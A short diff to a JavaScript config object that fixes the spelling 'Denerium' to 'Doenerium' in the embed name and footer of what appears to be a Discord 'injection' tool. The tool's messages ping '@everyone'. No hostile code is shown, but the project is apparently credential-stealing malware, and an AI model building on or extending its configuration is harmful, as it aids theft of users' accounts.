@@ -22,9 +22,9 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Trap Injection Based Of Denerium",
+        username: "Trap Injection Based Of Doenerium",
         footer: {
-            text: `Trap Injection Based Of Denerium"`,
+            text: `Trap Injection Based Of Doenerium"`,
             icon_url: 'https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png'.replace(/ /g, '%20'),
         },
         href: "https://github.com/TheCuteOwl",
